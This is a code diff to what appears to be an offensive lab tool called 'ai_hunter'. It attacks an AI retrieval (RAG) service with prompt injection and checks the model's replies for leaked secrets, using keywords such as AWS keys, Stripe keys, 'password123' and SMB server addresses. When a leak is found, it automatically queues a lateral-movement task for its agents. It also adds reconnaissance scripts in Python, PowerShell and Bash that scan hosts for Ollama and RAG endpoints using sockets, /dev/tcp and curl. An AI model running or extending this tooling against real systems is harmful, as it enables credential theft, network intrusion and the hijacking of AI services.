@@ -2841,6 +2841,8 @@ def ai_hunter_direct_attack():
         creds = custom_creds or LAB_TARGET["credentials"]
         prompts = custom_prompts or get_strategy_prompts(strategy)
 
+        # Grab the first online agent for lateral movement task assignment
+        _first_agent = next(iter(agents), "ai_hunter")
         report = {
             "target_url": target_url,
             "strategy": strategy,
@@ -2849,6 +2851,7 @@ def ai_hunter_direct_attack():
             "docs": [],
             "llm_responses": [],
             "errors": [],
+            "_agent_id": _first_agent,
         }
 
         # ── Step 1: health check ──────────────────────────────────
@@ -2939,7 +2942,11 @@ def ai_hunter_direct_attack():
                             leaked = any(kw in reply.lower() for kw in [
                                 "db_pass", "secret", "aws_access_key", "stripe_secret",
                                 "sk_live", "salesforce", "akia", "supersecrethey",
-                                "production-credentials", "db_user=", "poisoned"
+                                "production-credentials", "db_user=", "poisoned",
+                                # SMB / network-topology doc indicators
+                                "password123", "10.5.9.40", "acme-files-01",
+                                "samba", "network-topology", "smb file server",
+                                "\\\\10.5.9", "//10.5.9",
                             ])
                             report["llm_responses"].append({
                                 "user": cred["username"],
@@ -2948,6 +2955,21 @@ def ai_hunter_direct_attack():
                                 "reply": reply[:1500],
                                 "injection_succeeded": leaked,
                             })
+                            # Real-time SMB intel scan — if creds are leaked, auto-queue
+                            # lateral movement task and store alert for the dashboard
+                            if leaked:
+                                _intel = _scan_for_smb_intel(reply)
+                                if _intel and not any(
+                                    a.get("intel", {}).get("target_ip") == _intel["target_ip"]
+                                    for a in lateral_movement_alerts
+                                ):
+                                    agent_id_for_alert = report.get("_agent_id", "ai_hunter")
+                                    _alert = _auto_lateral_move(_intel, agent_id_for_alert)
+                                    lateral_movement_alerts.insert(0, _alert)
+                                    logger.warning(
+                                        "[AI HUNTER] SMB intel detected via direct_attack — "
+                                        "lateral movement task queued automatically"
+                                    )
                     except Exception as ce:
                         report["errors"].append(f"Chat failed for {cred['username']}: {ce}")
 
@@ -2983,6 +3005,34 @@ def main():
     except Exception:
         ifaces = {"lo": ["127.0.0.1"]}
 
+    # Probe known AI service endpoints on the local network
+    ai_services = []
+    probe_targets = [
+        ("172.30.0.11", 11434, "ollama",       "/api/tags"),
+        ("172.30.0.10", 8080,  "corpaai_rag",  "/health"),
+        ("127.0.0.1",   11434, "ollama",       "/api/tags"),
+        ("127.0.0.1",   8080,  "corpaai_rag",  "/health"),
+    ]
+    import urllib.request as _ur
+    for host, port, svc, path in probe_targets:
+        try:
+            s = socket.create_connection((host, port), timeout=1)
+            s.close()
+            try:
+                with _ur.urlopen(f"http://{host}:{port}{path}", timeout=2) as r:
+                    banner = r.read(512).decode(errors="replace")
+            except Exception:
+                banner = ""
+            ai_services.append({
+                "service": svc,
+                "url": f"http://{host}:{port}",
+                "port": port,
+                "banner_preview": banner[:200],
+                "ollama_api": f"http://{host}:{port}/api/chat" if svc == "ollama" else None,
+            })
+        except Exception:
+            pass
+
     info = {
         "hostname":    socket.gethostname(),
         "fqdn":        socket.getfqdn(),
@@ -2994,6 +3044,7 @@ def main():
         "cwd":         os.getcwd(),
         "interfaces":  ifaces,
         "path":        os.environ.get("PATH", ""),
+        "ai_services_discovered": ai_services,
     }
     print(json.dumps(info, indent=2))
     return info
@@ -3159,8 +3210,29 @@ main()
 
 _MOCK_RECON_POWERSHELL = [
     (
-        "Gather system information: hostname, OS, user, network adapters",
+        "Gather system information, network adapters and probe for AI services",
         '''\
+$aiServices = @()
+$probeTargets = @(
+    @{Host="172.30.0.11";Port=11434;Svc="ollama";Path="/api/tags"},
+    @{Host="172.30.0.10";Port=8080; Svc="corpaai_rag";Path="/health"},
+    @{Host="127.0.0.1";  Port=11434;Svc="ollama";Path="/api/tags"},
+    @{Host="127.0.0.1";  Port=8080; Svc="corpaai_rag";Path="/health"}
+)
+foreach ($t in $probeTargets) {
+    $tcp = New-Object System.Net.Sockets.TcpClient
+    try {
+        $conn = $tcp.BeginConnect($t.Host, $t.Port, $null, $null)
+        if ($conn.AsyncWaitHandle.WaitOne(1000, $false)) {
+            $banner = ""
+            try {
+                $banner = (Invoke-WebRequest -Uri "http://$($t.Host):$($t.Port)$($t.Path)" -TimeoutSec 2 -UseBasicParsing -ErrorAction Stop).Content.Substring(0, [Math]::Min(200, 99999))
+            } catch {}
+            $aiServices += @{service=$t.Svc; url="http://$($t.Host):$($t.Port)"; port=$t.Port; banner_preview=$banner}
+        }
+    } catch {} finally { $tcp.Close() }
+}
+
 $info = [ordered]@{
     Hostname    = $env:COMPUTERNAME
     Username    = "$env:USERDOMAIN\\$env:USERNAME"
@@ -3168,10 +3240,11 @@ $info = [ordered]@{
     Architecture = $env:PROCESSOR_ARCHITECTURE
     PSVersion   = $PSVersionTable.PSVersion.ToString()
     Uptime      = ((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime).ToString()
-    NetworkAdapters = Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength |
-                       Where-Object { $_.IPAddress -notlike "169.*" } | ConvertTo-Json -Depth 2
+    NetworkAdapters = (Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength |
+                       Where-Object { $_.IPAddress -notlike "169.*" } | ConvertTo-Json -Depth 2)
+    AIServicesDiscovered = $aiServices
 }
-$info | ConvertTo-Json -Depth 3
+$info | ConvertTo-Json -Depth 4
 ''',
     ),
     (
@@ -3257,7 +3330,7 @@ foreach ($path in $searchPaths) {
 
 _MOCK_RECON_BASH = [
     (
-        "Collect system info: hostname, OS, user, network interfaces",
+        "Collect system info, network interfaces and probe for AI/LLM services",
         '''\
 #!/bin/bash
 echo "=== SYSTEM INFO ===" && uname -a
@@ -3266,6 +3339,17 @@ echo "=== USER ===" && id
 echo "=== NETWORK INTERFACES ===" && ip addr 2>/dev/null || ifconfig 2>/dev/null
 echo "=== ROUTES ===" && ip route 2>/dev/null || netstat -rn 2>/dev/null
 echo "=== ENV ===" && env | grep -v -i 'pass\|secret\|token'
+echo "=== AI/LLM SERVICE PROBE ==="
+for TARGET in "172.30.0.11:11434" "172.30.0.10:8080" "127.0.0.1:11434" "127.0.0.1:8080"; do
+    HOST="${TARGET%%:*}"; PORT="${TARGET##*:}"
+    if (echo > /dev/tcp/$HOST/$PORT) 2>/dev/null; then
+        echo "OPEN   $HOST:$PORT"
+        BANNER=$(curl -sf --max-time 2 "http://$HOST:$PORT/health" 2>/dev/null || \
+                 curl -sf --max-time 2 "http://$HOST:$PORT/api/tags" 2>/dev/null)
+        [ -n "$BANNER" ] && echo "  BANNER: $BANNER" | head -c 300
+        echo "  ollama_url: http://$HOST:$PORT"
+    fi
+done
 ''',
     ),
     (
